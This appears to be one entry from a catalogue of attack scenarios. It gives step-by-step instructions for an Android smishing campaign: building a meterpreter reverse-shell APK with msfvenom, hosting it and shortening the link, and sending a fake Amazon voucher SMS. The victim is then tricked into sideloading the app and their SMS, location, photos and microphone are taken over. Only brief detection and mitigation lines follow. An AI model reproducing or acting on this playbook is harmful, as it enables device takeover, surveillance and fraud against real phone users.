Attack Steps: 1. Create Malicious APK: Use msfvenom -p android/meterpreter/reverse_tcp LHOST=YOUR_IP LPORT=YOUR_PORT -o payload.apk to generate malicious APK. Or use Evil-Droid toolkit. 2. Host APK Online: Upload payload.apk to a hosting platform (e.g., GitHub Pages, 000webhost) or locally via ngrok http 80. Get the HTTPS link. 3. Shorten Link: Use bit.ly to obfuscate the long APK URL. 4. Craft SMS Message: Write an enticing SMS like “Free ₹100 Amazon Voucher for Airtel users. Tap here to claim: [shortlink]”. 5. Send SMS to Target: Use SMS APIs (Fast2SMS, Twilio trial) or a disposable phone with SIM card to send it to victim. 6. Victim Taps & Downloads APK: When victim taps the link, browser auto-starts APK download. 7. Trick Victim to Install: Page instructs user to “Allow unknown sources” if blocked. Victim installs APK thinking it’s legit. 8. App Runs & Connects to Attacker: Once installed, the payload auto-runs and connects back to your Metasploit handler (msfconsole -x "use exploit/multi/handler ...") and opens a meterpreter shell. 9. Access Victim Device: Use meterpreter commands to grab SMS, GPS, photos, mic, etc.
Vulnerability: No verification of APK sources via SMS
MITRE Technique: T1602.001 - Download New Code at Runtime
Impact: Remote full access to user device
Detection Method: Monitor unverified APK downloads, sideload warnings
Solution: Block APK installs from browser, enforce Play Store-only sources
Tags: smishing, malware dropper, android apk, payload, sms download

Title: Fake Job / Offer Scams via SMS
